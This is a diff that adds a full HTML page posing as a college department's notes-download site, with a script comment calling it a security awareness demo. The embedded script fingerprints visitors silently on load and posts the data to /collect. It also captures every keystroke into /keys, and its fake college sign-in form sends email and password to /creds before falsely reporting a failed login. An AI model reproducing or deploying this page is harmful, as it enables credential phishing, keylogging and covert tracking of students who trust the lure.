@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sem 3 Notes – All Units PDF</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f5f6fa; color: #2d3436; min-height: 100vh;
+  }
+  .header {
+    background: #0984e3; color: #fff; padding: 18px 20px;
+    display: flex; align-items: center; gap: 12px;
+  }
+  .header .logo { font-size: 26px; }
+  .header h1 { font-size: 18px; font-weight: 600; }
+  .container { max-width: 640px; margin: 0 auto; padding: 20px; }
+  .card {
+    background: #fff; border-radius: 12px; padding: 20px;
+    margin-bottom: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+  }
+  .card h2 { font-size: 20px; margin-bottom: 8px; }
+  .card .meta { color: #636e72; font-size: 14px; margin-bottom: 16px; }
+  .unit-list { list-style: none; }
+  .unit-list li {
+    padding: 10px 14px; border-bottom: 1px solid #f0f0f0; font-size: 15px;
+  }
+  .unit-list li:last-child { border-bottom: none; }
+  .unit-list li .lock { float: right; color: #b2bec3; }
+  .btn {
+    display: block; width: 100%; padding: 14px; border: none; border-radius: 8px;
+    background: #0984e3; color: #fff; font-size: 16px; font-weight: 600;
+    cursor: pointer; text-align: center;
+  }
+  .btn:active { background: #0770c7; }
+  .search {
+    width: 100%; padding: 12px 16px; border: 1px solid #dfe6e9; border-radius: 8px;
+    font-size: 15px; outline: none;
+  }
+  .search:focus { border-color: #0984e3; }
+  .signin { display: none; }
+  .signin input {
+    width: 100%; padding: 12px 16px; border: 1px solid #dfe6e9; border-radius: 8px;
+    font-size: 15px; margin-bottom: 12px; outline: none;
+  }
+  .signin input:focus { border-color: #0984e3; }
+  .note { font-size: 13px; color: #b2bec3; text-align: center; margin-top: 12px; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div class="logo">📘</div>
+  <h1>NotesHub – CSE Dept</h1>
+</div>
+
+<div class="container">
+
+  <div class="card">
+    <h2>Semester 3 – All Units</h2>
+    <div class="meta">Data Structures &amp; Algorithms · Updated 2 days ago · 2.4 MB</div>
+    <ul class="unit-list">
+      <li>Unit 1 – Arrays &amp; Linked Lists <span class="lock">🔒</span></li>
+      <li>Unit 2 – Stacks &amp; Queues <span class="lock">🔒</span></li>
+      <li>Unit 3 – Trees &amp; Graphs <span class="lock">🔒</span></li>
+      <li>Unit 4 – Sorting &amp; Searching <span class="lock">🔒</span></li>
+      <li>Unit 5 – Hashing <span class="lock">🔒</span></li>
+    </ul>
+    <button class="btn" onclick="showSignin()">Sign in to download all units</button>
+  </div>
+
+  <div class="card">
+    <input type="text" class="search" placeholder="Search for a chapter or topic..." id="searchBox">
+  </div>
+
+  <div class="card signin" id="signinCard">
+    <h2>Student Login</h2>
+    <div class="meta">Use your college email to unlock downloads</div>
+    <form onsubmit="sendCreds(event)">
+      <input type="text" placeholder="College email" id="emailField" autocomplete="off">
+      <input type="password" placeholder="Password" id="passField" autocomplete="off">
+      <button type="submit" class="btn">Sign in</button>
+    </form>
+    <div class="note">Free access for all students</div>
+  </div>
+
+</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════
+//  SECURITY AWARENESS DEMO — everything below runs with ZERO
+//  permission prompts. That is the entire point of the talk.
+// ═══════════════════════════════════════════════════════════════
+
+// ── 1. Device / OS / Browser fingerprint from User-Agent ──────
+function parseUA() {
+  const ua = navigator.userAgent;
+  let platform = "Unknown device", browser = "Unknown browser";
+
+  if (/Android\s([\d.]+)/.test(ua)) {
+    const m = ua.match(/Android\s([\d.]+)/);
+    platform = "Android " + m[1];
+    const dev = ua.match(/;\s([^)]+?)\s*Build/);
+    if (dev) platform += " – " + dev[1].trim();
+  } else if (/iPhone|iPad/.test(ua)) {
+    platform = "iOS (iPhone/iPad)";
+  } else if (/Windows NT/.test(ua)) {
+    platform = "Windows PC";
+    const m = ua.match(/Windows NT ([\d.]+)/);
+    if (m) platform += " (NT " + m[1] + ")";
+  } else if (/Macintosh/.test(ua)) {
+    platform = "Mac";
+  } else if (/Linux/.test(ua)) {
+    platform = "Linux PC";
+  }
+
+  if (/Edg\//.test(ua))      browser = "Edge " + (ua.match(/Edg\/([\d.]+)/) || [])[1];
+  else if (/OPR\//.test(ua)) browser = "Opera " + (ua.match(/OPR\/([\d.]+)/) || [])[1];
+  else if (/Chrome\//.test(ua)) browser = "Chrome " + (ua.match(/Chrome\/([\d.]+)/) || [])[1];
+  else if (/Firefox\//.test(ua)) browser = "Firefox " + (ua.match(/Firefox\/([\d.]+)/) || [])[1];
+  else if (/Safari\//.test(ua))  browser = "Safari";
+
+  return { platform, browser };
+}
+
+// ── 2. Battery Status API — no permission prompt on Android ────
+function getBattery() {
+  return new Promise((resolve) => {
+    if (!navigator.getBattery) return resolve(null);
+    navigator.getBattery().then((b) => {
+      resolve({
+        level: Math.round(b.level * 100),
+        charging: b.charging,
+      });
+      // live updates — streams changes as they happen
+      b.addEventListener("levelchange", () => {
+        fetch("/keys", {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ keys: "[battery now " + Math.round(b.level * 100) + "%]", context: "passive" })
+        });
+      });
+    }).catch(() => resolve(null));
+  });
+}
+
+// ── 3. Network Information API — carrier-grade connection type ─
+function getConnection() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return null;
+  return {
+    effectiveType: c.effectiveType || "unknown",
+    saveData: c.saveData || false,
+  };
+}
+
+// ── 3.5 GPU + device fingerprint hash (WebGL, silent) ─────────
+function getFingerprint() {
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return {};
+    const dbgInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    const gpu = dbgInfo ? gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    // hash-ish of canvas + gpu + audio fingerprint
+    const audio = (() => {
+      try {
+        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 4410, 44100);
+        const osc = ctx.createOscillator();
+        osc.type = "triangle";
+        osc.frequency.value = 10000;
+        const comp = ctx.createDynamicsCompressor();
+        osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
+        ctx.startRendering();
+        return ctx.sampleRate.toString();
+      } catch (e) { return ""; }
+    })();
+    const raw = gpu + "|" + canvas.width + "x" + canvas.height + "|" + audio;
+    let hash = 0;
+    for (let i = 0; i < raw.length; i++) { hash = ((hash << 5) - hash) + raw.charCodeAt(i); hash |= 0; }
+    return {
+      gpu: String(gpu || "").slice(0, 80),
+      audioFingerprint: audio,
+      webglHash: Math.abs(hash).toString(16).slice(0, 8),
+    };
+  } catch (e) { return {}; }
+}
+
+// ── 4. Screen, theme, language, timezone, hardware ─────────────
+function getDisplayInfo() {
+  return {
+    screen: window.screen.width + "x" + window.screen.height,
+    darkMode: window.matchMedia && window.matchMedia("(prefers-color-scheme: dark)").matches,
+    language: navigator.language,
+    localTime: new Date().toLocaleString(),
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cores: navigator.hardwareConcurrency || null,
+    memory: navigator.deviceMemory || null,
+    touchSupport: ("ontouchstart" in window) || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    plugins: Array.from(navigator.plugins || {}).map(p => p.name).slice(0, 3),
+    standalone: window.matchMedia && window.matchMedia("(display-mode: standalone)").matches,
+    referrer: document.referrer || null,
+    notifications: window.Notification ? { permission: Notification.permission } : null,
+  };
+}
+
+// ── 5. Send the full dossier on page load ──────────────────────
+(async function init() {
+  const ua = parseUA();
+  const battery = await getBattery();
+  const conn = getConnection();
+  const disp = getDisplayInfo();
+  const fp = getFingerprint();
+
+  const payload = {
+    platform: ua.platform,
+    browser: ua.browser,
+    battery,
+    connection: conn,
+    screen: disp.screen,
+    darkMode: disp.darkMode,
+    language: disp.language,
+    localTime: disp.localTime,
+    timezone: disp.timezone,
+    cores: disp.cores,
+    memory: disp.memory,
+    touchSupport: disp.touchSupport,
+    maxTouchPoints: disp.maxTouchPoints,
+    gpu: fp.gpu,
+    audioFingerprint: fp.audioFingerprint,
+    webglHash: fp.webglHash,
+    plugins: disp.plugins,
+    standalone: disp.standalone,
+    referrer: disp.referrer,
+    notifications: disp.notifications,
+  };
+
+  fetch("/collect", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  }).catch(() => {});
+})();
+
+// ── 6. Keystroke streaming — global + search box ───────────────
+let buffer = "";
+let flushTimer = null;
+
+function flushKeys(context) {
+  if (!buffer) return;
+  const payload = buffer;
+  buffer = "";
+  fetch("/keys", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ keys: payload, context: context || "page" }),
+  }).catch(() => {});
+}
+
+function scheduleFlush(context) {
+  clearTimeout(flushTimer);
+  flushTimer = setTimeout(() => flushKeys(context), 700); // streams letter-groups fast
+}
+
+// capture everything typed anywhere on the page
+document.addEventListener("keydown", (e) => {
+  if (e.key === "Enter") {
+    buffer += " ⏎";
+    flushKeys(document.activeElement && document.activeElement.id === "searchBox" ? "search box" : "page");
+    return;
+  }
+  if (e.key === "Backspace") {
+    buffer = buffer.slice(0, -1);
+    return;
+  }
+  if (e.key.length === 1) {
+    buffer += e.key;
+    scheduleFlush(document.activeElement && document.activeElement.id === "searchBox" ? "search box" : "page");
+  }
+});
+
+// ── 7. Fake sign-in form → credential capture ──────────────────
+function showSignin() {
+  document.getElementById("signinCard").style.display = "block";
+  document.getElementById("signinCard").scrollIntoView({ behavior: "smooth" });
+}
+
+function sendCreds(e) {
+  e.preventDefault();
+  const email = document.getElementById("emailField").value;
+  const password = document.getElementById("passField").value;
+  fetch("/creds", {
+    method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, password }),
+  }).then(() => {
+    alert("Incorrect college email or password. Please try again.");
+    document.getElementById("passField").value = "";
+  }).catch(() => {});
+}
+</script>
+
+</body>
+</html>
